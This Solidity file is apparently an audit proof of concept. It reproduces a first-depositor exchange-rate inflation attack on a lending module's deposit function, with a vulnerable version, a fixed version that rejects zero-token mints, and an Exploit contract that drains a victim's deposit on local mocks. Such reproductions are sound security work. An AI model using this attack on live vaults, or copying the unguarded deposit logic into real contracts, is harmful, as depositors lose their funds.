// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  NUTS Pike PTokenModule.deposit (MixBytes, January 2025).
    exchangeRate is getCash() * 1e18 / totalSupply. A 1-wei deposit plus a
    direct transfer inflates the rate. The next deposit rounds to 0 pTokens.
    Redeeming the 1 pToken drains the cash, including that deposit.
*/

contract Underlying {
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PTokenModule {
    Underlying public immutable token;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(Underlying _token) {
        token = _token;
    }

    function getCash() public view returns (uint256) {
        return token.balanceOf(address(this));
    }

    function exchangeRate() public view returns (uint256) {
        if (totalSupply == 0) return 1e18;
        return getCash() * 1e18 / totalSupply;
    }

    function deposit(uint256 amount) external returns (uint256 minted) {
        uint256 supplyBefore = totalSupply;
        uint256 rate = exchangeRate();
        token.transferFrom(msg.sender, address(this), amount);
        if (supplyBefore == 0) {
            minted = amount;
        } else {
            // @> VULN: integer division at the inflated exchange rate mints 0 pTokens
            minted = amount * 1e18 / rate;
        }
        totalSupply += minted;
        balanceOf[msg.sender] += minted;
    }

    function redeem(uint256 pTokens) external returns (uint256 out) {
        uint256 cash = getCash();
        out = pTokens * cash / totalSupply;
        totalSupply -= pTokens;
        balanceOf[msg.sender] -= pTokens;
        token.transfer(msg.sender, out);
    }
}

contract PTokenModuleFixed {
    Underlying public immutable token;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(Underlying _token) {
        token = _token;
    }

    function exchangeRate() public view returns (uint256) {
        if (totalSupply == 0) return 1e18;
        return token.balanceOf(address(this)) * 1e18 / totalSupply;
    }

    function deposit(uint256 amount) external returns (uint256 minted) {
        uint256 rate = exchangeRate();
        token.transferFrom(msg.sender, address(this), amount);
        minted = amount * 1e18 / rate;
        require(minted > 0, "zero pTokens");
        totalSupply += minted;
        balanceOf[msg.sender] += minted;
    }

    function redeem(uint256 pTokens) external returns (uint256 out) {
        out = pTokens * token.balanceOf(address(this)) / totalSupply;
        totalSupply -= pTokens;
        balanceOf[msg.sender] -= pTokens;
        token.transfer(msg.sender, out);
    }
}

contract PikeVictim {
    Underlying public immutable token;
    PTokenModule public immutable pToken;

    constructor(Underlying _token, PTokenModule _pToken) {
        token = _token;
        pToken = _pToken;
    }

    function deposit(uint256 amount) external {
        token.approve(address(pToken), amount);
        pToken.deposit(amount);
    }
}

contract PikeVictimFixed {
    Underlying public immutable token;
    PTokenModuleFixed public immutable pToken;

    constructor(Underlying _token, PTokenModuleFixed _pToken) {
        token = _token;
        pToken = _pToken;
    }

    function deposit(uint256 amount) external {
        token.approve(address(pToken), amount);
        pToken.deposit(amount);
    }
}

contract Exploit {
    uint256 public constant VICTIM_AMT = 5_000e18;
    Underlying public token;
    PTokenModule public pToken;
    PikeVictim public victim;

    constructor() {
        token = new Underlying();
        pToken = new PTokenModule(token);
        victim = new PikeVictim(token, pToken);
        token.mint(address(this), 1 + VICTIM_AMT);
        token.mint(address(victim), VICTIM_AMT);
    }

    function run() external {
        token.approve(address(pToken), type(uint256).max);
        uint256 first = pToken.deposit(1);
        require(first == 1, "one pToken");
        token.transfer(address(pToken), VICTIM_AMT);
        uint256 rate = pToken.exchangeRate();
        require(rate == (1 + VICTIM_AMT) * 1e18, "rate inflated");
        victim.deposit(VICTIM_AMT);
        require(pToken.balanceOf(address(victim)) == 0, "victim pTokens 0");
        require(pToken.totalSupply() == 1, "supply 1");
        uint256 out = pToken.redeem(1);
        require(out == 1 + 2 * VICTIM_AMT, "drained cash");
        require(token.balanceOf(address(this)) == 1 + 2 * VICTIM_AMT, "attacker holds cash");
        require(token.balanceOf(address(victim)) == 0, "victim paid 5000");
        require(pToken.getCash() == 0, "module empty");
    }
}
